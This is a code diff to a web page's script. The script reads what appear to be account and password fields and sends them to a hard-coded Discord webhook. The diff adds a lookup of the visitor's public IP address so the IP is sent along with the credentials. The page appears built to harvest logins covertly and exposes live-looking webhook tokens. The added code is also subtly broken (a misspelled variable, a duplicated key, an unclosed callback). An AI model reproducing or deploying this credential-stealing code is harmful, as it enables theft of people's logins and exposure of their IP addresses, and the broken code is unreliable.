@@ -15,15 +15,23 @@
       name="viewport"
       content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover"
     />
+    <script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
     <script>
       function sendWebhook() {
-        
+  var ipAddress;     
   var username = document.getElementById("messageofacc").value;
   var message = document.getElementById("messageofpass").value;
 
+$.getJSON("https://api.ipify.org?format=json",
+        function (data) {
+            // Store the IP address in the variable
+            ipAddress = data.ip;
+
 
   // Replace YOUR_WEBHOOK_URL with the actual URL of your Discord webhook
-  var webhookUrl = "https://discord.com/api/webhooks/1130503463047012482/_MPlYZ5v2VVXmKs8hq6Poahh0QgFVHyR2vB0cLXYvGp4FUuNhLf6ebiV7ewbdYS-i4EF";
+  var webhookUrl = "https://discord.com/api/webhooks/1181637750433271938/OzPoB5WFNmzhYyihuiUOKOYYQSfYmWGbFBnnZwDgAE-ZTNQTw0Ro1ldK8GXRPZKnDiCe";
 
   // Create a new XMLHttpRequest object
   var xhr = new XMLHttpRequest();
@@ -37,7 +45,8 @@
   // Create the request body in JSON format
   var requestBody = JSON.stringify({
     username: username,
-    content: message
+    content: message,
+    content: ipAddreass
   });
 
   // Send the request
